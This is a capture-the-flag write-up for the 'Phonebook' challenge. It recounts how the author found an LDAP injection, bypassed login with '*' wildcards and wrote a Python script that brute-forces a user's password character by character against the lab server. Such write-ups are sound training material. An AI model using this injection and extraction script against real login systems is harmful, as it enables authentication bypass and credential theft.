# Phonebook

## Keynotes

* LDAP
* Brute-force

## Tracking

1. I obviously went too far with this box for its difficulty, but Iwasn't able to find something on my own without a solid hint. I tried nmap, dirb, sqlmap, hydra, analysis of source code, but nothing worked, although I was able to find a second page that didn't help me at all because it was denying all requests with a `403` status code

	```
	http://178.62.0.100:32416/964430b4cdd199af19b986eaf2193b21f32542d0/
	```

2. I observed, though, that the login page breaks when the payload includes `)` or `\`so I was aware that some kind of escaping was happening on server-side

3. Then I got a huge hint which was `LDAP` -and it's a shame that Iwas not even thinking aboutit

4. Started looking into LDAP vulnerabilities and I didn't need to look very hard - I tried some combinations and the `*` payload for both username and password allowed me to login and redirected me to the search page I found before, this time authenticated with a cookie

5. Found all the entries in the database using a blank input, including the emails which I assumed that, by stripping the @somewhere.com part, will be interpreted as usernames

6. Remembered something about Reese, the name mentioned on the login page, and found it in the database

7. After some guesses and some other hints, I moved back to the login page and I tried to login with different usernames

8. After some times and a little more help, I realized that each combination of `username`/`*` will work, but I could also use it to guess the passwords by checking one character at a time

9. The most obvious choice was `reese`, so I wrote a python script to brute-force the password, which was actually the flag
	* `password.txt` contains each character on the keyboard on a new-line, excepting the ones that produce an error `)`, `\`
	```python
	import requests

	url = 'http://178.62.0.100:31478/login'
	found = ''

	while True:
		# 
		with open('passwords.txt', 'r+') as passwords:
			for line in passwords:
				pwd = found + line.replace('\n', '') + '*'

				payload = {'username': 'reese', 'password': pwd}
				x = requests.post(url, data = payload)
					
				if 'Set-Cookie' in x.history[0].headers:
					found = pwd.split('*')[0]
					print(found)
					break
	```